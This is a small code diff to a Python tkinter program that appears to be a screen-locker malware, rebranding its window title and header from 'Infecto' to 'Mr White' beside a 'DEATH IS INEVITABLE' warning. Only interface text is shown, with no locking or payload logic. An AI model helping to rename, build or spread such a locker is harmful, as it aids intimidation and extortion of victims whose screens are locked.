@@ -62,7 +62,7 @@ def exiting():
     messagebox.showwarning("ScreenLocker", "DEATH IS INEVITABLE")
     wind.destroy()
 
-wind.title("Infecto Locker")
+wind.title("Mr Whites Locker")
 wind.configure(bg="#2C3E50")
 
 # Modern font and color styles
@@ -71,7 +71,7 @@ font_medium = ("Helvetica", 16)
 font_small = ("Helvetica", 12)
 
 # Header and warning text
-header = tk.Label(wind, text="Fucked By Infecto", bg="#2C3E50", fg="#ECF0F1", font=font_large)
+header = tk.Label(wind, text="Fucked By Mr White", bg="#2C3E50", fg="#ECF0F1", font=font_large)
 header.pack(pady=20)
 
 lock_message = tk.Label(wind, text=lock_text, bg="#2C3E50", fg="#ECF0F1", font=font_medium, wraplength=600)
